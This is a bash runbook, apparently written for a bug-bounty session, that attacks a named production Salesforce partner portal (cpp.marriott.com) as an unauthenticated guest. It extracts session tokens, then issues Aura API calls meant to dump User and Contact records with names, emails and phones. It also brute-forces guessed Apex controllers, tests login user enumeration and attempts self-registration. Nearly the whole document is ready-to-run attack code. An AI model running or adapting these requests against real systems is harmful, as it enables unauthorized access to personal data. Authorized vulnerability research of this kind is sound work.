# Session 9 Runbook — M002 Chain Elevation
# Goal: Elevate cpp.marriott.com schema exposure to record access (Low → High/Critical)
# Date: 2026-06-22
# Context: Session 8 Phase B was entirely broken — aura_real() missing aura.context= prefix.
#          Real fwuid has NEVER been properly tested against record-access actions.
#          This session fixes that and exhausts all chain paths.

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
OUTDIR="$BB/results/marriott/session9"
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session9-output.txt") 2>&1

echo "=== SESSION 9 START: $(date) ==="

# ============================================================
# PHASE A — BOOTSTRAP: fresh fwuid + session cookies
# fwuid rotates with Salesforce deployments. Always extract fresh.
# ============================================================
echo ""
echo "===== PHASE A: BOOTSTRAP ====="

# A1: Get fresh guest session cookie
echo "--- A1: Fresh guest session cookie ---"
curl -skL -c /tmp/cpp-s9-cookies.txt "https://cpp.marriott.com/s/" -o /tmp/cpp-s9-home.html
echo "Cookies captured:"
cat /tmp/cpp-s9-cookies.txt | grep -v '^#' | grep -v '^$'

# A2: Extract fresh fwuid from bootstrap page
echo "--- A2: Extract fresh fwuid from page ---"
FRESH_FWUID=$(cat /tmp/cpp-s9-home.html | python3 -c "
import sys, re
html = sys.stdin.read()
# Pattern 1: inline JSON bootstrap
m = re.search(r'\"fwuid\"\s*:\s*\"([^\"]+)\"', html)
if m:
    print(m.group(1))
    import sys; sys.exit(0)
# Pattern 2: bootstrap script tag
m = re.search(r'fwuid=([A-Za-z0-9_\-]+)', html)
if m:
    print(m.group(1))
" 2>/dev/null)

echo "Fresh fwuid: ${FRESH_FWUID:-NOT FOUND}"

# Fall back to Session 7 extracted value if page extraction fails
if [ -z "$FRESH_FWUID" ]; then
  FRESH_FWUID="cmpKNldRZXRSMkdjemxQdjBkbl9uQWtVMjdnTGFERUU2S3FfSVdrcU92bkExNC4xOTIuODM4ODYwOA"
  echo "Using Session 7 fwuid (fallback): ${FRESH_FWUID}"
fi

# A3: Validate fwuid — getObjectInfo must return state=SUCCESS
echo "--- A3: Validate fwuid with getObjectInfo(User) ---"
VALIDATION=$(curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s9-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FRESH_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys,json
d=sys.stdin.read()
try:
    obj=json.loads(d[d.index('{'):])
    for a in obj.get('actions',[]):
        rv=a.get('returnValue',{}) or {}
        print(f\"state={a.get('state','?')} | fields={len(rv.get('fields',{}))}\")
except Exception as e:
    print(f'parse error: {e}')
    print(f'size={len(d)}B raw: {d[:200]}')
")
echo "Validation: $VALIDATION"
# If state=SUCCESS + fields=203 → fwuid is valid, proceed
# If state=warning → fwuid is stale, need to extract from Aura bootstrap error (see Phase A4)

# A4: If A3 returned warning, force a bootstrap error to extract new fwuid
echo "--- A4: Force bootstrap to extract current fwuid (if A3 failed) ---"
BOOTSTRAP_FWUID=$(curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s9-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"FORCE_REFRESH","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, re, json
d = sys.stdin.read()
# Extract fwuid from bootstrap response (appears in error body when fwuid mismatch)
hits = re.findall(r'\"fwuid\"\s*:\s*\"([A-Za-z0-9_\-]{20,})\"', d)
if hits:
    print(hits[0])
" 2>/dev/null)

if [ -n "$BOOTSTRAP_FWUID" ]; then
  echo "Bootstrap fwuid extracted: $BOOTSTRAP_FWUID"
  FRESH_FWUID="$BOOTSTRAP_FWUID"
fi

echo "=== USING FWUID: $FRESH_FWUID ==="

# ============================================================
# Aura helper — CORRECTED (aura.context= prefix present)
# ============================================================
aura() {
  local descriptor="$1"
  local params="$2"
  curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s9-cookies.txt \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"${descriptor}\",\"callingDescriptor\":\"UNKNOWN\",\"params\":${params}}]}" \
    --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FRESH_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined'
}

parse() {
  python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    # Check for updated fwuid in response
    import re
    fw = re.findall(r'\"fwuid\"\s*:\s*\"([A-Za-z0-9_\-]{20,})\"', raw)
    if fw: print(f'  [fwuid in response: {fw[0][:40]}...]')
    for a in obj.get('actions', []):
        state = a.get('state', '?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'  state={state}')
        if isinstance(rv, dict):
            keys = list(rv.keys())[:8]
            print(f'  returnValue keys: {keys}')
            fields = rv.get('fields', {})
            if fields: print(f'  field_count={len(fields)}')
            # Check for records in any common key
            for rkey in ['records','items','data','result','users','contacts']:
                recs = rv.get(rkey)
                if isinstance(recs, list) and recs:
                    print(f'  *** RECORDS ({rkey}): {len(recs)} ***')
                    for r in recs[:3]:
                        print(f'    {json.dumps(r)[:400]}')
            # Nested records
            if 'records' in rv and isinstance(rv['records'], dict):
                inner = rv['records'].get('records', [])
                if inner:
                    print(f'  *** NESTED RECORDS: {len(inner)} ***')
                    for r in inner[:3]: print(f'    {json.dumps(r)[:400]}')
        elif isinstance(rv, list) and rv:
            print(f'  returnValue list: {len(rv)} items')
            for r in rv[:2]: print(f'    {json.dumps(r)[:300]}')
        if err:
            msg = err[0].get('message','') if isinstance(err,list) and err else str(err)
            print(f'  error: {msg[:300]}')
except Exception as e:
    print(f'  parse_error: {e}')
    print(f'  raw: {raw[:300]}')
" 2>&1
}

# ============================================================
# PHASE B — RECORD ACCESS (highest priority — never properly tested)
# This is the ShinyHunters chain: schema → getItems/searchRecords → PII
# ============================================================
echo ""
echo "===== PHASE B: RECORD ACCESS WITH VALID FWUID ====="

# B1: getItems on User — primary record listing call
# SUCCESS + records → HIGH FINDING (unauthenticated user enumeration)
# ERROR "access denied" → guest profile correctly blocks (not a finding)
# ERROR other / state=warning → further probing needed
echo "--- B1: getItems(User) - primary record listing ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":5,"currentPage":0}' | parse

# B2: getListUi — alternative record listing via list view API
echo "--- B2: getListUi(User, AllUsers) ---"
aura "aura://RecordUiController/ACTION\$getListUi" \
  '{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5,"pageToken":null,"fields":["User.Id","User.Email","User.Name","User.FirstName","User.LastName"],"optionalFields":[],"sortBy":null,"updateMru":false}' | parse

# B3: searchRecords — SOSL-based search, often bypasses list view restrictions
# Search for "a" which should match almost all users
echo "--- B3: searchRecords(User, q=a) ---"
aura "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"User","fields":["User.Id","User.Name","User.Email","User.FirstName","User.LastName","User.Phone","User.CompanyName"],"optionalFields":[],"pageSize":10}' | parse

# B4: searchRecords on Contact — might be accessible even though getObjectInfo was blocked
echo "--- B4: searchRecords(Contact, q=a) ---"
aura "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"Contact","fields":["Contact.Id","Contact.Name","Contact.Email","Contact.Phone","Contact.AccountId"],"optionalFields":[],"pageSize":10}' | parse

# B5: getCurrentUserOrGuest — returns guest User record (confirms guest user Id)
echo "--- B5: getCurrentUserOrGuest ---"
aura "aura://UserController/ACTION\$getCurrentUserOrGuest" '{}' | parse
# Extract guest user Id from response for use in B6

# B6: getRecord with guest user ID (from B5) and real User IDs
echo "--- B6: getRecord with User IDs ---"
for SFID in "0050000000000001AAA" "0050000000000002AAA" "0053000000000001AAA"; do
  RESULT=$(aura "aura://RecordUiController/ACTION\$getRecord" \
    "{\"recordId\":\"${SFID}\",\"fields\":[\"User.Id\",\"User.Email\",\"User.Name\",\"User.FirstName\",\"User.LastName\"],\"optionalFields\":[]}" \
    | python3 -c "
import sys,json
d=sys.stdin.read()
try:
    obj=json.loads(d[d.index('{'):])
    for a in obj.get('actions',[]):
        state=a.get('state','?')
        rv=a.get('returnValue') or {}
        rec=rv.get('record',{}) or {}
        flds=rec.get('fields',{})
        if flds:
            vals={k:v.get('value') for k,v in flds.items() if v.get('value')}
            print(f'state={state} | {vals}')
        else:
            print(f'state={state}')
except: print(len(d),'B')
" 2>/dev/null)
  echo "  getRecord(${SFID}): ${RESULT}"
done

# ============================================================
# PHASE C — CUSTOM APEX CONTROLLERS (CPP partner portal)
# apex:// descriptors bypass standard FLS/CRUD — often written
# without `with sharing`, exposing records to guest users
# ============================================================
echo ""
echo "===== PHASE C: CUSTOM APEX CONTROLLERS ====="

# C1: Common CPP (Community Partner Portal) controller names
# These are guesses based on the portal's purpose (hotel franchise partners)
echo "--- C1: CPP apex controller probe ---"
for CTRL in \
  "PartnerController" \
  "PartnerAccountController" \
  "FranchiseController" \
  "HotelController" \
  "PropertyController" \
  "PropertySearchController" \
  "UserProfileController" \
  "RegistrationController" \
  "SearchController" \
  "GlobalSearchController" \
  "DocumentController" \
  "ContractController" \
  "CommunityController" \
  "SiteController" \
  "PortalController" \
  "PartnerPortalController" \
  "CPPController" \
  "MarriottController"; do
  for METHOD in "getProperties" "getPartners" "searchProperties" "getUsers" "getAccounts" "search" "getData" "getList" "getRecords" "init" "getProperty" "getPartner"; do
    RESULT=$(aura "apex://${CTRL}/ACTION\$${METHOD}" \
      '{"pageSize":5,"searchTerm":"","page":1}' \
      | python3 -c "
import sys,json
d=sys.stdin.read()
size=len(d)
try:
    obj=json.loads(d[d.index('{'):])
    for a in obj.get('actions',[]):
        state=a.get('state','?')
        err=a.get('error') or []
        msg=err[0].get('message','') if isinstance(err,list) and err else ''
        # INTERESTING: SUCCESS or error that's not 'no such action' / 'no such type'
        if state=='SUCCESS':
            rv=a.get('returnValue')
            print(f'*** SUCCESS: apex://{CTRL}/{METHOD} | rv={str(rv)[:200]}')
        elif state=='ERROR':
            # Filter out 'not found' errors — only show interesting ones
            boring = ['No action found', 'No such type', 'no such column', 'does not exist']
            if not any(b.lower() in msg.lower() for b in boring):
                print(f'INTERESTING ERROR: apex://{CTRL}/{METHOD} | {msg[:150]}')
except: pass
" 2>/dev/null)
    [ -n "$RESULT" ] && echo "$RESULT"
  done
done

# C2: CommLoginController — test email enumeration
# If error message differs between valid/invalid email → user enumeration (Low-Medium)
echo "--- C2: CommLoginController email enumeration test ---"
echo "Test 1 — definitely invalid email:"
aura "apex://CommLoginController/ACTION\$login" \
  '{"username":"zzz_definitely_invalid_99999@notreal-xyz-test.com","password":"INVALID_PW_TEST!","startUrl":""}' | parse

echo "Test 2 — plausible corporate email format (Marriott domain):"
aura "apex://CommLoginController/ACTION\$login" \
  '{"username":"test@marriott.com","password":"INVALID_PW_TEST!","startUrl":""}' | parse

# If error messages differ → user enumeration confirmed
# "Invalid password" for real user vs "No account found" for fake user = enumeration

# C3: SelfRegisterController — community self-registration
# Often exposed for new partner onboarding
echo "--- C3: SelfRegisterController ---"
aura "apex://CommunitiesSelfRegController/ACTION\$selfRegister" \
  '{"firstName":"Test","lastName":"User","email":"zzz_test_99999@notreal-xyz.com","password":"","confirmPassword":"","accountId":"","regConfirmUrl":"","extraFields":null,"startUrl":"","includePassword":false}' | parse

# ============================================================
# PHASE D — GETRELATEDLISTRECORDS + OBJECT RELATIONSHIPS
# Even if User records are blocked, related objects might not be
# ============================================================
echo ""
echo "===== PHASE D: RELATED LIST TRAVERSAL ====="

# D1: getRelatedListInfo on User — what relationships does User have?
echo "--- D1: getRelatedListInfo(User) ---"
aura "aura://RelatedListUiController/ACTION\$getRelatedListInfo" \
  '{"parentObjectApiName":"User","relatedListId":"Assets","recordTypeId":null}' | parse

# D2: getRelatedListsInfo — enumerate all related lists for User
echo "--- D2: getRelatedListsInfo(User) ---"
aura "aura://RelatedListUiController/ACTION\$getRelatedListsInfo" \
  '{"parentObjectApiName":"User","recordTypeId":null}' | parse

# D3: getRelatedListRecords — try to get records via relationship traversal
echo "--- D3: getRelatedListRecords via User ---"
aura "aura://RelatedListUiController/ACTION\$getRelatedListRecords" \
  '{"parentRecordId":"0050000000000001AAA","relatedListId":"Contacts","fields":["Contact.Name","Contact.Email"],"pageSize":5}' | parse

# ============================================================
# PHASE E — GETPICKLISTVALUES + METADATA LEAK
# Even without records, metadata can reveal org structure
# ============================================================
echo ""
echo "===== PHASE E: METADATA EXPOSURE ====="

# E1: getPicklistValues — might expose internal option values
echo "--- E1: getPicklistValues(User.UserType) ---"
aura "aura://RecordUiController/ACTION\$getPicklistValues" \
  '{"objectApiName":"User","recordTypeId":"012000000000000AAA","fieldApiName":"UserType"}' | parse

echo "--- E1b: getPicklistValues(User.LanguageLocaleKey) ---"
aura "aura://RecordUiController/ACTION\$getPicklistValues" \
  '{"objectApiName":"User","recordTypeId":"012000000000000AAA","fieldApiName":"LanguageLocaleKey"}' | parse

# E2: getObjectInfos (plural) — batch schema for related objects
echo "--- E2: getObjectInfos(User, Contact, Account) ---"
aura "aura://RecordUiController/ACTION\$getObjectInfos" \
  '{"objectApiNames":["User","Contact","Account","Lead"]}' | parse

# E3: getLayoutUserState — layout config for User object
echo "--- E3: getLayoutUserState(User) ---"
aura "aura://RecordUiController/ACTION\$getLayoutUserState" \
  '{"objectApiName":"User","recordTypeId":null,"layoutType":"Full"}' | parse

# ============================================================
# PHASE F — COMMUNITY-SPECIFIC ACTIONS
# Salesforce Community Cloud exposes community-specific controllers
# ============================================================
echo ""
echo "===== PHASE F: COMMUNITY-SPECIFIC CONTROLLERS ====="

# F1: NetworkMemberController — community membership data
echo "--- F1: NetworkMemberController ---"
aura "aura://NetworkMemberController/ACTION\$getMembership" '{}' | parse

# F2: CommunityMembersController
echo "--- F2: CommunityMembersController ---"
aura "aura://CommunityMembersController/ACTION\$getMembers" \
  '{"networkId":"","pageSize":10,"page":0}' | parse

# F3: UserProfileController — public profile data
echo "--- F3: UserProfileMenuController ---"
aura "aura://UserProfileMenuController/ACTION\$getUserProfileMenu" '{}' | parse

# F4: ChatterController — activity feed (might expose user list)
echo "--- F4: ChatterController ---"
aura "aura://ChatterController/ACTION\$getUsers" '{"pageSize":10,"pageToken":null}' | parse

# F5: getFlows — list available Flows (might reveal business logic)
echo "--- F5: getFlows ---"
aura "aura://FlowController/ACTION\$getFlows" '{}' | parse

echo ""
echo "=== SESSION 9 COMPLETE: $(date) ==="
echo "=== OUTPUT: $OUTDIR/session9-output.txt ==="
echo ""
echo "=== DECISION MATRIX ==="
echo "Phase B: any SUCCESS + records → M002 elevates to HIGH. Submit immediately."
echo "Phase C: any apex controller SUCCESS → document, assess data returned, elevate to MEDIUM/HIGH."
echo "Phase C2: different error messages for valid/invalid email → user enumeration = LOW/MEDIUM."
echo "Phase B/D: all ERROR/warning → standalone finding remains LOW. Submit as Low, reference ShinyHunters campaign."
